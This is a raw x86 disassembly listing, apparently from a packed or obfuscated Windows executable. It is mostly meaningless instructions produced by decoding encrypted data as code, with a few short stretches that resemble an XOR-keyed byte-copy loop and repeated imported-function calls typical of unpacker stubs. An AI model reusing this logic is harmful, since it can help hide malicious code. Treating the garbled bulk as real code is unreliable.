  407ab6:	out    dx,al
  407ab7:	fld    TBYTE PTR [ebx-0x731ffa94]
  407abd:	ffree  st(6)
  407abf:	lods   eax,DWORD PTR ds:[esi]
  407ac0:	fadd   QWORD PTR [eax+eax*1-0x51]
  407ac4:	inc    edi
  407ac5:	fldcw  WORD PTR [edx+0x66835a08]
  407acb:	stos   DWORD PTR es:[edi],eax
  407acc:	mov    eax,0xeebe3176
  407ad1:	push   esp
  407ad2:	test   DWORD PTR [edi+0xfb2559],esi
  407ad8:	adc    BYTE PTR [edx],al
  407ada:	ins    BYTE PTR es:[edi],dx
  407adb:	out    0xdc,eax
  407add:	push   ebx
  407ade:	adc    DWORD PTR [ebp+0x61652bc4],esi
  407ae4:	push   ds
  407ae5:	add    BYTE PTR [esi-0x70],ch
  407ae8:	ret    
  407ae9:	push   esi
  407aea:	mov    edx,ebx
  407aec:	aas    
  407aed:	xor    al,0x1d
  407aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407af0:	inc    edi
  407af1:	inc    eax
  407af2:	aad    0x33
  407af4:	add    al,0x76
  407af6:	test   al,0x45
  407af8:	push   ss
  407af9:	arpl   WORD PTR [esi+0x3aeaa152],ax
  407aff:	and    DWORD PTR [edi+0x7503bf58],edx
  407b05:	sub    al,cl
  407b07:	sub    esi,DWORD PTR [eax+0x40e6ac9]
  407b0d:	pop    esi
  407b0e:	and    ecx,DWORD PTR [eax+0x1ca01a87]
  407b14:	xor    DWORD PTR [esi+0x43],esi
  407b17:	jmp    0x29fb3f8c
  407b1c:	pop    ecx
  407b1d:	clc    
  407b1e:	xor    al,0x8e
  407b20:	jmp    0x11cf:0x146559e
  407b27:	xchg   edi,eax
  407b28:	or     DWORD PTR [esi+0x6088faf6],edx
  407b2e:	mov    ah,0xaf
  407b30:	mov    es,edi
  407b32:	dec    DWORD PTR [edx]
  407b34:	push   0x1b
  407b36:	test   DWORD PTR [ecx],eax
  407b38:	jbe    0x407b58
  407b3a:	out    dx,al
  407b3b:	shr    DWORD PTR es:0x709318d1,1
  407b42:	jge    0x407adb
  407b44:	retw   0xf76c
  407b48:	adc    esi,ecx
  407b4a:	hlt    
  407b4b:	je     0x407b1d
  407b4d:	lods   al,BYTE PTR ds:[esi]
  407b4e:	lahf   
  407b4f:	jo     0xea4ee92e
  407b55:	sti    
  407b56:	bound  edi,QWORD PTR [esi+0x2362c0ef]
  407b5c:	mov    ds:0x636522eb,al
  407b61:	or     eax,0x75af1cfe
  407b66:	sar    al,1
  407b68:	jbe    0x407bca
  407b6a:	adc    eax,esp
  407b6c:	pop    ss
  407b6d:	cmp    ecx,DWORD PTR [eax]
  407b6f:	push   es
  407b70:	push   edi
  407b71:	cs addr16 cld 
  407b74:	into   
  407b75:	add    al,BYTE PTR [ebx+0x38510218]
  407b7b:	jns    0x407b5f
  407b7d:	bswap  ecx
  407b7f:	push   es
  407b80:	js     0x407be9
  407b82:	in     eax,dx
  407b83:	mov    eax,ds:0x1da5aa81
  407b88:	and    al,0x4f
  407b8a:	jmp    DWORD PTR [edi-0xa]
  407b8d:	out    dx,eax
  407b8e:	pushf  
  407b8f:	js     0x407be9
  407b91:	xchg   ecx,eax
  407b92:	xor    eax,0x304ed19f
  407b97:	pop    ss
  407b98:	or     BYTE PTR [ecx-0x5f0f6429],dl
  407b9e:	ret    0x3f1
  407ba1:	jge    0x407bb3
  407ba3:	xor    edx,ecx
  407ba5:	add    edx,esi
  407ba7:	cmp    edx,edi
  407ba9:	ja     0x407bff
  407baf:	push   ebx
  407bb0:	jmp    0x407bba
  407bb5:	mov    esi,0x32729f
  407bba:	mov    eax,DWORD PTR [ebp-0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x4]
  407bc0:	xor    edi,ecx
  407bc2:	add    edi,esi
  407bc4:	mov    esi,DWORD PTR [ebp+0x8]
  407bc7:	imul   edi,edx
  407bca:	mov    ebx,DWORD PTR [ebp+0xc]
  407bcd:	xor    eax,ecx
  407bcf:	add    eax,edx
  407bd1:	mov    al,BYTE PTR [ebx+eax*1+0x32729f]
  407bd8:	mov    BYTE PTR [edi+esi*1],al
  407bdb:	mov    eax,DWORD PTR [ebp-0x4]
  407bde:	xor    eax,ecx
  407be0:	lea    edx,[edx+eax*1+0x32729f]
  407be7:	mov    eax,DWORD PTR [ebp-0x4]
  407bea:	xor    eax,ecx
  407bec:	mov    esi,0xffcd8d61
  407bf1:	sub    esi,eax
  407bf3:	add    esi,DWORD PTR [ebp+0x10]
  407bf6:	cmp    edx,esi
  407bf8:	jbe    0x407bb5
  407bfe:	pop    ebx
  407bff:	mov    eax,0xf89c853b
  407c04:	pop    edi
  407c05:	pop    esi
  407c06:	leave  
  407c07:	ret    0xc
  407c0a:	push   ebp
  407c0b:	mov    ebp,esp
  407c0d:	mov    eax,ds:0x40d654
  407c12:	mov    DWORD PTR ds:0x417d0d,0x19
  407c1c:	cmp    DWORD PTR ds:0x417d0d,0x0
  407c23:	je     0x407c51
  407c29:	cmp    DWORD PTR ds:0x417d0d,0x1c
  407c30:	jne    0x407c3f
  407c36:	push   DWORD PTR [ebp-0x14]
  407c39:	call   DWORD PTR ds:0x40d368
  407c3f:	mov    ecx,DWORD PTR ds:0x417d0d
  407c45:	dec    ecx
  407c46:	mov    DWORD PTR ds:0x417d0d,ecx
  407c4c:	jmp    0x407c1c
  407c51:	mov    edx,0x32729f
  407c56:	sub    eax,edx
  407c58:	mov    ecx,0x7510859
  407c5d:	and    DWORD PTR ds:0x41230c,0x41aa42
  407c67:	push   esi
  407c68:	and    DWORD PTR ds:0x41aa42,0x0
  407c72:	push   DWORD PTR ds:0x41aa42
  407c78:	pop    esi
  407c79:	inc    esi
  407c7a:	mov    DWORD PTR ds:0x41aa42,esi
  407c80:	cmp    DWORD PTR ds:0x41aa42,0x28
  407c87:	jne    0x407ca2
  407c8d:	push   0x7e5a
  407c92:	push   0x41aa4e
  407c97:	push   0x1ce6
  407c9c:	call   DWORD PTR ds:0x40d1e0
  407ca2:	cmp    DWORD PTR ds:0x41aa42,0x1f
  407ca9:	jb     0x407c72
  407caf:	xor    DWORD PTR ds:0x4122e4,ebx
  407cb5:	mov    esi,DWORD PTR [ebp+0xc]
  407cb8:	xor    eax,ecx
  407cba:	jmp    0x407e39
  407cbf:	xchg   ebp,eax
  407cc0:	bound  ecx,QWORD PTR [ecx-0x6a06a6f5]
  407cc6:	pusha  
  407cc7:	jmp    0x2085:0xe5fdba79
  407cce:	mov    ecx,ebp
  407cd0:	adc    edi,DWORD PTR [esi+0x7e]
  407cd3:	fdivr  QWORD PTR [edi+0x7e]
  407cd6:	jle    0x407d34
  407cd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cd9:	xchg   esp,eax
  407cda:	les    edi,FWORD PTR [ecx]
  407cdc:	nop    eax
  407cdf:	ret    0x4b43
  407ce2:	test   al,0x3c
  407ce4:	inc    ecx
  407ce5:	inc    edi
  407ce6:	push   ebx
  407ce7:	iret   
  407ce8:	imul   BYTE PTR [eax+0x2896b464]
  407cee:	mov    ebx,0x6beaaf78
  407cf3:	(bad)
  407cf7:	aad    0x9a
  407cf9:	pop    ecx
  407cfa:	xchg   esi,eax
  407cfb:	stc    
  407cfc:	stc    
  407cfd:	scas   al,BYTE PTR es:[edi]
  407cfe:	push   ss
  407cff:	add    esp,DWORD PTR ds:0xaff8d1c2
  407d05:	inc    edi
  407d06:	dec    esi
  407d07:	(bad)  
  407d08:	loop   0x407cf0
  407d0a:	aaa    
  407d0b:	cmp    ah,ch
  407d0d:	das    
  407d0e:	data16 ja 0x407d72
  407d11:	dec    ebx
  407d12:	jns    0x407cfb
  407d14:	leave  
  407d15:	push   eax
  407d16:	sbb    dl,al
  407d18:	cli    
  407d19:	add    edx,ebp
  407d1b:	mov    esp,0xeceb4141
  407d20:	sub    al,ah
  407d22:	jne    0x407d84
  407d24:	cmp    ebx,DWORD PTR [ebx+0x46]
  407d27:	in     al,dx
  407d28:	arpl   WORD PTR cs:[eax-0x1560bc3e],cx
  407d2f:	push   eax
  407d30:	mov    WORD PTR [ebp-0x71],gs
  407d33:	jns    0x407d6b
  407d35:	test   al,0xea
  407d37:	add    al,0xd0
  407d39:	(bad)  
  407d3a:	loope  0x407cde
  407d3c:	or     bl,ah
  407d3e:	imul   edx,DWORD PTR [ecx],0x5899b70a
  407d44:	mov    ss,WORD PTR [edi-0x1517ec7a]
  407d4a:	stos   DWORD PTR es:[edi],eax
  407d4b:	call   0xdf2:0x770a3dab
  407d52:	and    BYTE PTR [esi-0x19684508],bh
  407d58:	idiv   DWORD PTR [edx-0x7686afe2]
  407d5e:	mov    ds:0x21cd282f,al
  407d64:	outs   dx,BYTE PTR ds:[esi]
  407d65:	fsub   DWORD PTR [esi+0x5d]
  407d68:	cmp    BYTE PTR [edx],0xdb
  407d6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d6c:	adc    BYTE PTR [eax+edx*1+0x633f7c9],dl
  407d73:	fs dec esi
  407d75:	xchg   BYTE PTR [ecx+0x14],ch
  407d78:	jmp    0x407d81
  407d7a:	loopne 0x407d3a
  407d7c:	mov    dh,0x71
  407d7e:	ja     0x407d0b
  407d80:	ficom  WORD PTR [ecx]
  407d82:	push   ebx
  407d83:	imul   ebx,DWORD PTR [ebp+0x1d],0x13
  407d87:	sub    ch,bl
  407d89:	or     dl,bl
  407d8b:	dec    ecx
  407d8c:	push   edx
  407d8d:	sbb    BYTE PTR [esp+ecx*1],ch
  407d90:	ud1    edi,edx
  407d93:	fwait
  407d94:	rcr    BYTE PTR [ecx],1
  407d96:	ret    0xb34
  407d99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d9a:	stc    
  407d9b:	test   esp,edi
  407d9d:	jns    0x407dcd
  407d9f:	adc    ch,BYTE PTR ds:0xf350a276
  407da5:	sbb    edi,DWORD PTR ds:0x56b157f1
  407dab:	idiv   BYTE PTR [ebp+edi*1-0x4e]
  407daf:	sbb    esi,eax
  407db1:	fs daa 
  407db3:	xchg   ebx,eax
  407db4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407db5:	lea    ecx,[ebp+0x7]
  407db8:	ficomp DWORD PTR [ebp+ebx*2-0x119ff3dc]
  407dbf:	xchg   ecx,eax
  407dc0:	ret    0xad42
  407dc3:	loope  0x407d97
  407dc5:	sub    al,0xd8
  407dc7:	punpckhwd mm7,QWORD PTR [edx-0x24a86ca3]
  407dce:	pop    esp
  407dcf:	pop    eax
  407dd0:	push   edx
  407dd1:	addr16 jg 0x407dc0
  407dd4:	out    dx,eax
  407dd5:	(bad)  
  407dd6:	fmul   DWORD PTR [esi]
  407dd8:	and    DWORD PTR [ebx],esp
  407dda:	neg    ecx
  407ddc:	stc    
  407ddd:	jne    0x407db8
  407ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407de0:	push   es
  407de1:	stc    
  407de2:	cmp    eax,0xb5b4d3f2
  407de7:	loope  0x407dac
  407de9:	xchg   ecx,eax
  407dea:	call   0x2d62bfc6
  407def:	(bad)  
  407df0:	adc    dh,dl
  407df2:	jno    0x407dd6
  407df4:	ds xor ecx,edi
  407df7:	push   0xb6ccdf9b
  407dfc:	jge    0x407db1
  407dfe:	pop    ebx
  407dff:	mov    al,ds:0x82cc62ae
  407e04:	call   0x5c85:0xf042fcf6
  407e0b:	xchg   edi,eax
  407e0c:	add    DWORD PTR [edi-0x18],edx
  407e0f:	adc    ecx,DWORD PTR [esi]
  407e11:	sar    bh,1
  407e13:	xchg   esi,eax
  407e14:	mov    ecx,0xd81222e2
  407e19:	cs dec esp
  407e1b:	or     dl,BYTE PTR [eax+0x16]
  407e1e:	and    BYTE PTR [eax],0x72
  407e21:	stos   DWORD PTR es:[edi],eax
  407e22:	fisubr DWORD PTR [eax+0x23ed81a5]
  407e28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e29:	jns    0x407e82
  407e2b:	test   dl,0xa0
  407e2e:	jmp    0x407de0
  407e30:	mov    eax,ds:0x7c3d4d1c
  407e35:	aas    
  407e36:	out    dx,eax
  407e37:	push   esi
  407e38:	jmp    0x407e75
  407e3a:	mov    bh,0x5
  407e3d:	push   edx
  407e3e:	stos   BYTE PTR es:[edi],al
  407e3f:	inc    ecx
  407e40:	add    ch,dl
  407e42:	inc    ebp
  407e43:	add    BYTE PTR [eax],al
  407e45:	je     0x40818a
  407e4b:	mov    eax,ds:0x40d64c
  407e50:	mov    esi,DWORD PTR [ebp+0xc]
  407e53:	sub    eax,edx
  407e55:	xor    eax,ecx
  407e57:	cmp    eax,esi
  407e59:	jne    0x407e6f
  407e5f:	mov    eax,ds:0x40d654
  407e64:	add    eax,DWORD PTR ds:0x40d64c
  407e6a:	jmp    0x407ff5
  407e6f:	mov    eax,DWORD PTR [ebp+0xc]
  407e72:	jmp    0x407ff1
  407e77:	icebp  
  407e78:	mov    ebp,0x65db1f07
  407e7d:	mov    ecx,0x1c6c5851
  407e82:	cmp    ebp,edi
  407e84:	clc    
  407e85:	pop    edi
  407e86:	xor    DWORD PTR [edi+0x10],ecx
  407e89:	jle    0x407f09
  407e8b:	fdivr  QWORD PTR [edi+0x7e]
  407e8e:	jle    0x407e14
  407e90:	stc    
  407e91:	xor    bh,BYTE PTR [edi]
  407e93:	fwait
  407e94:	int    0x31
  407e96:	fild   WORD PTR [edi-0x26]
  407e99:	ds mov ch,0x39
  407e9c:	jb     0x407e80
  407e9e:	leave  
  407e9f:	cmp    ecx,edi
  407ea1:	repz shl BYTE PTR [eax+eax*2],cl
  407ea5:	sahf   
  407ea6:	repz inc esp
  407ea8:	add    esp,DWORD PTR [ecx]
  407eaa:	adc    DWORD PTR [eax+0x32],edi
  407ead:	out    0xce,eax
  407eaf:	add    al,0x8
  407eb1:	jne    0x407eeb
  407eb3:	setle  al
  407eb6:	sahf   
  407eb7:	out    0x5a,al
  407eb9:	sbb    eax,0x42c2afcb
  407ebe:	shr    BYTE PTR [ebx],0xb6
  407ec1:	aad    0xce
  407ec3:	mov    esi,0xdd01e038
  407ec8:	sbb    BYTE PTR [ebx],0x9d
  407ecb:	pushf  
  407ecc:	fistp  QWORD PTR [edx+0x117dd9e9]
  407ed2:	xor    BYTE PTR [ebx-0x7b17ce16],bl
  407ed8:	and    esp,DWORD PTR [ebp+0x4c]
  407edb:	int3   
  407edc:	inc    esp
  407edd:	xor    al,0x40
  407edf:	push   esi
  407ee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ee1:	mov    ebx,0xfd173be2
  407ee6:	shl    BYTE PTR [ebx+0x48ce03dc],cl
  407eec:	jmp    0xfcd0:0x9b16e9df
  407ef3:	test   ah,bl
  407ef5:	push   edi
  407ef6:	outs   dx,BYTE PTR ds:[esi]
  407ef7:	sbb    edi,0x8ecf5b95
  407efd:	and    ah,BYTE PTR [bx+di-0xe]
  407f01:	mov    DWORD PTR [ebp-0x6a],esp
  407f04:	mov    ds:0x28ba4227,eax
  407f09:	mov    ds,edx
  407f0b:	sbb    eax,0x85982425
  407f10:	xor    eax,0x3a344bbc
  407f15:	lea    esp,[esi-0x40a1b17]
  407f1b:	lahf   
  407f1c:	jl     0x407ecd
  407f1e:	push   0x8334c9de
  407f23:	pop    esi
  407f24:	clc    
  407f25:	(bad)  
  407f26:	das    
  407f27:	(bad)  
  407f28:	call   DWORD PTR ds:0xc750deeb
  407f2e:	sahf   
  407f2f:	mov    bl,0xa3
  407f31:	pusha  
  407f32:	mov    WORD PTR ds:0xb22a6ed8,ds
  407f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f39:	pop    es
  407f3a:	sbb    dl,BYTE PTR [ebx-0xe]
  407f3d:	test   eax,0x8b8f183a
  407f42:	or     BYTE PTR [esi-0x3f],dh
  407f45:	je     0x407f16
  407f47:	sahf   
  407f48:	inc    edi
  407f49:	pop    ds
  407f4a:	or     BYTE PTR [edx+0x1cc84c09],dh
  407f50:	and    eax,0x9c08daf9
  407f55:	inc    edi
  407f56:	test   al,0x35
  407f58:	inc    eax
  407f59:	cmp    dl,BYTE PTR [edi-0x26]
  407f5c:	ror    BYTE PTR [ebx-0xb5ac4f5],1
  407f62:	in     eax,dx
  407f63:	adc    DWORD PTR [ebx+0x28894a2e],esp
  407f69:	sub    BYTE PTR [ecx+0x22],dh
  407f6c:	rcr    DWORD PTR [eax-0x44],cl
  407f6f:	jl     0x407f17
  407f71:	sbb    al,0x73
  407f73:	dec    ecx
  407f74:	loope  0x407fcf
  407f76:	int3   
  407f77:	sub    eax,0x6461a43b
  407f7c:	addr16 pusha 
  407f7e:	inc    DWORD PTR [ebp-0x4589bd1a]
  407f84:	test   ch,al
  407f86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f87:	pop    esi
  407f88:	dec    ebx
  407f89:	jae    0x407f30
  407f8b:	cmc    
  407f8c:	fsubr  DWORD PTR [eax+0x222f372e]
  407f92:	cmp    ah,dh
  407f94:	dec    edx
  407f95:	xor    eax,0x1b068fa7
  407f9a:	and    BYTE PTR [ecx+edx*1-0x63],ch
  407f9e:	in     eax,0x96
  407fa0:	jmp    0x2d121981
  407fa5:	add    bl,dl
  407fa7:	repz sub ebx,DWORD PTR [edi+0x1db089e9]
  407fae:	ret    0x5e8
  407fb1:	int3   
  407fb2:	int3   
  407fb3:	test   BYTE PTR [edx-0x7b],al
  407fb6:	cmp    ebx,esi
  407fb8:	fisttp DWORD PTR [edx+0x63]
  407fbb:	pop    ebp
  407fbc:	pop    eax
  407fbd:	fcom   QWORD PTR [eax-0x521d19f3]
  407fc3:	jo     0x407ff7
  407fc5:	xchg   BYTE PTR [eax],dl
  407fc7:	sbb    al,cl
  407fc9:	mov    ebp,0x901009db
  407fce:	xor    DWORD PTR [ebp+0x6ab5aa41],ebx
  407fd4:	jne    0x407ffc
  407fd6:	fdivr  QWORD PTR [edx+0x5a]
  407fd9:	mov    DWORD PTR [edx+0x69],eax
  407fdc:	das    
  407fdd:	adc    al,0x6a
  407fdf:	mov    edi,DWORD PTR [ecx]
  407fe1:	outs   dx,DWORD PTR ds:[esi]
  407fe2:	push   cs
  407fe3:	sbb    DWORD PTR [esi],0xf790b327
  407fe9:	adc    esi,DWORD PTR [ecx+0x35cea7fa]
  407fef:	add    eax,0x3c13378
  407ff4:	ret    0x4ca3
  407ff7:	(bad)  
  407ff8:	inc    eax
  407ff9:	add    BYTE PTR [ebx+0x7ae90c45],cl
  407fff:	add    DWORD PTR [eax],eax
  408001:	add    BYTE PTR [ebx],ah
  408003:	das    
  408004:	pop    ds
  408005:	xchg   edx,eax
  408006:	adc    esp,DWORD PTR [edx+0x57bdafa3]
  40800c:	arpl   WORD PTR [edi],si
  40800e:	pop    ss
  40800f:	cli    
  408010:	arpl   WORD PTR [ecx+0x7e7e162d],di
  408016:	fdivr  QWORD PTR [edi+0x7e]
  408019:	jle    0x408092
  40801b:	pusha  
  40801c:	sti    
  40801d:	xchg   edi,eax
  40801e:	repz dec edx
  408020:	popa   
  408021:	je     0x40805e
  408023:	inc    esi
  408024:	mov    al,ds:0x6122784b
  408029:	cmp    BYTE PTR [edi],ch
  40802b:	cli    
  40802c:	mov    esp,0x239db5ce
  408031:	push   esi
  408032:	out    dx,eax
  408033:	outs   dx,BYTE PTR ds:[esi]
  408034:	loopne 0x408076
  408036:	inc    ebx
  408037:	stc    
  408038:	(bad)  
  408039:	ins    WORD PTR es:[edi],dx
  40803b:	mov    al,BYTE PTR [ebp-0x32594f23]
  408041:	cwde   
  408042:	push   ds
  408043:	call   0xef87:0xb6793cc2
  40804a:	jecxz  0x4080a0
  40804c:	sti    
  40804d:	or     esp,edi
  40804f:	cmc    
  408050:	out    0xf8,eax
  408052:	xor    ch,BYTE PTR [edi+edx*8-0xecdbcc4]
  408059:	push   ebx
  40805a:	xor    al,BYTE PTR [ebx+ecx*2-0xb2d2694]
  408061:	lock xchg BYTE PTR [edi+0x49],bh
  408065:	scas   eax,DWORD PTR es:[edi]
  408066:	test   BYTE PTR [ecx-0x1502a2fd],cl
  40806c:	call   0xfce223f0
  408071:	std    
  408072:	mov    ebp,0x99bb137d
  408078:	mov    esi,DWORD PTR [edx-0x52664026]
  40807e:	fisubr WORD PTR [ebx-0x78150d1f]
  408084:	movnti DWORD PTR [edi],ebx
  408087:	pop    es
  408088:	pop    ebp
  408089:	lea    edi,[esi+0x2081d8ea]
  40808f:	mov    dl,0xf9
  408091:	out    0x2e,eax
  408093:	inc    eax
  408094:	cmp    al,0x98
  408096:	dec    esi
  408097:	pop    esp
  408098:	mov    BYTE PTR [eax+0x6e278be6],0x16
  40809f:	push   0xf5cd1025
  4080a4:	call   FWORD PTR [ecx-0x3]
  4080a7:	lock fs ds dec edx
  4080ab:	mov    ebp,0x7ae39654
  4080b0:	inc    edi
  4080b1:	sub    cl,BYTE PTR [ebx+0x189d58f2]
  4080b7:	fwait
  4080b8:	fs xor bl,bh
  4080bb:	dec    ebp
  4080bc:	sbb    DWORD PTR [eax+0x3a],ebp
  4080bf:	retf   
  4080c0:	xlat   BYTE PTR ds:[ebx]
  4080c1:	mov    edi,0xa285ad0b
  4080c6:	sub    eax,0x59a680f7
  4080cb:	and    al,0x10
  4080cd:	aam    0x55
  4080cf:	dec    esp
  4080d0:	mov    ebp,DWORD PTR [eax]
  4080d2:	sub    BYTE PTR [ebx*4-0x73b9a343],dh
  4080d9:	dec    ebx
  4080da:	dec    eax
  4080db:	mov    cl,0x71
  4080dd:	jae    0x408098
  4080df:	mov    eax,ds:0xf0faaa47
  4080e4:	fwait
  4080e5:	test   eax,0x24f4d1ed
  4080ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080eb:	adc    BYTE PTR [edx],bh
  4080ed:	es and al,0xf1
  4080f0:	xor    ebp,DWORD PTR [ecx-0x77]
  4080f3:	adc    ch,BYTE PTR [esi]
  4080f5:	and    esp,DWORD PTR [ebx-0x42]
  4080f8:	sub    BYTE PTR [edx+0x50fd8bda],bh
  4080fe:	xor    DWORD PTR [edx+0x7ac562df],ebx
  408104:	adc    dl,BYTE PTR [edx+0x36edba7f]
  40810a:	xor    ebp,ebp
  40810c:	mov    ch,0x60
  40810e:	and    dh,BYTE PTR [esi]
  408110:	sahf   
  408111:	mov    bh,0x88
  408113:	xchg   edx,eax
  408114:	pop    esp
  408115:	ret    0x6d18
  408118:	gs push es
  40811a:	jne    0x408185
  40811c:	mov    ch,0xf0
  40811e:	inc    esi
  40811f:	jp     0x40810f
  408121:	sbb    BYTE PTR [edi],cl
  408123:	jp     0x408146
  408125:	cmp    al,0xa9
  408127:	sbb    al,0x62
  408129:	popf   
  40812a:	rcl    BYTE PTR ds:0xf60bce44,0x22
  408131:	or     ebx,DWORD PTR [esi+0x10]
  408134:	pop    ebp
  408135:	pop    edi
  408136:	das    
  408137:	test   BYTE PTR [ecx-0x36],cl
  40813a:	xchg   esi,eax
  40813b:	jge    0x4080e1
  40813d:	pop    edx
  40813e:	push   esp
  40813f:	fsubp  st(3),st
  408141:	rcl    BYTE PTR [edi-0x3d6bcc1e],0x40
  408148:	(bad)  
  408149:	mov    DWORD PTR [edx],0x85f9f52
  40814f:	xchg   ecx,eax
  408150:	jmp    0x408124
  408152:	inc    esp
  408153:	cmp    eax,0xcfeb7f8b
  408158:	mov    BYTE PTR [ecx+ecx*2],al
  40815b:	mov    esp,0x4ca4ecd0
  408160:	add    al,0x1d
  408162:	(bad)  
  408163:	aaa    
  408164:	aad    0xee
  408166:	rcl    DWORD PTR [esp],1
  408169:	push   ds
  40816a:	sti    
  40816b:	or     bl,BYTE PTR [ebp+0x5a]
  40816e:	push   esi
  40816f:	test   BYTE PTR [esi-0x7e969957],ah
  408175:	sahf   
  408176:	xor    edx,DWORD PTR gs:0x3352f5ce
  40817d:	rol    DWORD PTR [ebx],0xc2
  408180:	mov    ds:0x40d654,eax
  408185:	jmp    0x408313
  40818a:	mov    eax,ds:0x40d654
  40818f:	jmp    0x40830e
  408194:	push   edi
  408195:	(bad)  [ecx+0x797ba9ef]
  40819b:	gs mov ch,0x6e
  40819e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40819f:	es xor eax,0x83ecfbc7
  4081a5:	pop    ss
  4081a6:	jle    0x408226
  4081a8:	fdivr  QWORD PTR [edi+0x7e]
  4081ab:	jle    0x4081c8
  4081ad:	pop    ebp
  4081ae:	dec    eax
  4081af:	xor    esp,ebx
  4081b1:	shr    bh,1
  4081b3:	jne    0x408201
  4081b5:	or     DWORD PTR ds:0x647dce61,eax
  4081bb:	lods   eax,DWORD PTR ds:[esi]
  4081bc:	mov    edi,DWORD PTR [edi-0x4504ed4a]
  4081c2:	(bad)  
  4081c3:	test   eax,0xbe7e71f1
  4081c8:	dec    ecx
  4081c9:	imul   esi,esp,0xffffff9d
  4081cc:	inc    ebp
  4081cd:	inc    ecx
  4081ce:	jp     0x4081ce
  4081d0:	pop    es
  4081d1:	ds je  0x408156
  4081d4:	dec    ebp
  4081d5:	jecxz  0x408184
  4081d7:	imul   edx,DWORD PTR [eax-0x2f6bd6ec],0x6
  4081de:	ins    DWORD PTR es:[edi],dx
  4081df:	pop    edx
  4081e0:	leave  
  4081e1:	or     BYTE PTR [ecx-0x23],ch
  4081e4:	mov    edi,0x9a9ec3fe
  4081e9:	xor    al,0xd1
  4081eb:	cmp    DWORD PTR [ecx-0x3058a2f9],esi
  4081f1:	cmp    eax,0xb65be508
  4081f6:	das    
  4081f7:	dec    esp
  4081f8:	mov    eax,0xe3fbd32b
  4081fd:	cli    
  4081fe:	pop    esp
  408200:	rol    BYTE PTR [esp+ecx*8],cl
  408203:	mov    bl,0x9e
  408205:	psrld  mm2,mm2
  408208:	out    0xf8,eax
  40820a:	fs test bh,ch
  40820d:	dec    edx
  40820e:	gs jmp 0x40821a
  408211:	enter  0x4531,0xe
  408215:	add    al,0x82
  408217:	jl     0x408210
  408219:	ret    0x7df4
  40821c:	pop    ss
  40821d:	jg     0x40823b
  40821f:	arpl   WORD PTR [ebp+0x31],bp
  408222:	dec    eax
  408223:	and    BYTE PTR [ebx-0x2adb7fe0],ah
  408229:	stos   BYTE PTR es:[edi],al
  40822a:	movsx  edi,bl
  40822d:	cld    
  40822e:	mov    ds:0xbddec768,al
  408233:	jecxz  0x4081fc
  408235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408236:	add    BYTE PTR [ecx],0x6d
  408239:	and    al,0xdc
  40823b:	arpl   WORD PTR [esi],si
  40823d:	push   ecx
  40823e:	call   0xddb1:0x14ee208c
  408245:	pop    ds
  408246:	ret    
  408247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408248:	popf   
  408249:	pop    ss
  40824a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40824b:	repnz mov dh,0x18
  40824e:	cli    
  40824f:	ins    DWORD PTR es:[edi],dx
  408250:	sbb    al,0x8b
  408252:	shl    esi,0x69
  408255:	sbb    eax,DWORD PTR [edx-0x6d374965]
  40825b:	push   esp
  40825c:	sub    bl,BYTE PTR [ebx+0x63]
  40825f:	aas    
  408260:	xor    ebx,DWORD PTR [eax]
  408262:	sbb    DWORD PTR [eax+0x2b],ecx
  408265:	bound  ebp,QWORD PTR [esi+0x78]
  408268:	and    eax,0x169e3ccb
  40826d:	dec    ebx
  40826e:	sbb    dl,bl
  408270:	xlat   BYTE PTR ds:[ebx]
  408271:	pushf  
  408272:	aam    0xe5
  408274:	pushf  
  408275:	ja     0x408255
  408277:	fist   WORD PTR [esi+0x394163b7]
  40827d:	sti    
  40827e:	mov    ds:0x513aa984,eax
  408283:	pop    esp
  408284:	pop    ss
  408285:	nop
  408286:	icebp  
  408287:	jl     0x40823b
  408289:	js     0x4082fd
  40828b:	cdq    
  40828c:	shl    edi,0x22
  40828f:	iret   
  408290:	cli    
  408291:	prefetch BYTE PTR [ebx+edi*2]
  408295:	stc    
  408296:	lods   al,BYTE PTR ds:[esi]
  408297:	and    eax,0x22ac1231
  40829c:	push   ecx
  40829d:	and    ebx,DWORD PTR [eax+0x7f]
  4082a0:	jne    0x40822e
  4082a2:	push   edx
  4082a3:	jecxz  0x4082cc
  4082a5:	sbb    eax,0x3647d674
  4082aa:	ins    WORD PTR es:[edi],dx
  4082ac:	leave  
  4082ad:	repz sbb edi,ecx
  4082b0:	mov    esp,0x2374b92a
  4082b5:	and    ch,bl
  4082b7:	and    eax,0x75f978a9
  4082bc:	inc    ebp
  4082bd:	hlt    
  4082be:	ins    BYTE PTR es:[edi],dx
  4082bf:	(bad)  
  4082c0:	jno    0x40826e
  4082c2:	lods   eax,DWORD PTR ds:[esi]
  4082c3:	push   0xffffffdc
  4082c5:	adc    eax,0xc6543075
  4082ca:	ins    DWORD PTR es:[edi],dx
  4082cb:	dec    edx
  4082cc:	aaa    
  4082cd:	aam    0xb5
  4082cf:	jle    0x40825f
  4082d1:	and    eax,ebp
  4082d3:	jg     0x408275
  4082d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082d6:	dec    esi
  4082d7:	fidivr DWORD PTR [ebp+0xa]
  4082da:	enter  0xe352,0x7f
  4082de:	ds xchg ebx,eax
  4082e0:	mov    edx,0x57bc1cf7
  4082e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082e6:	lahf   
  4082e7:	ins    BYTE PTR es:[edi],dx
  4082e8:	sbb    edi,edi
  4082ea:	fld    DWORD PTR [eax+0x63331f37]
  4082f0:	loope  0x4082bd
  4082f2:	mov    eax,ds:0x85340986
  4082f7:	test   eax,0xf9361e7d
  4082fc:	and    ch,BYTE PTR [eax]
